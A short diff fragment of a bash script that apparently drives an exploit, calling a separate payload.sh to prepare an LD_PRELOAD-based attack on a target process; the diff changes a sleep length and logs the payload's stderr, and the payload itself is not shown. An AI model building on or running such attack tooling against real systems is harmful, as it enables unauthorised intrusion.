@@ -1,11 +1,11 @@
 #!/bin/bash
 STARTTIME=$(date +%s)
-SLEEPLEN=90
+SLEEPLEN=30
 echo "Preparing for exploitation, finding LD_PRELOAD if necessary" >&2
 sleep 30 2>/dev/null &
 PID=$!
 TARGET=${1}
-PRELOAD=$(bash payload.sh ${PID} ${TARGET} PREPARE 2>/dev/null)
+PRELOAD=$(bash payload.sh ${PID} ${TARGET} PREPARE 2>preload.log)
 [[ ! $? -eq 0 ]] && exit 1
 
 if [[ ! -z "${PRELOAD[@]}" ]]; then
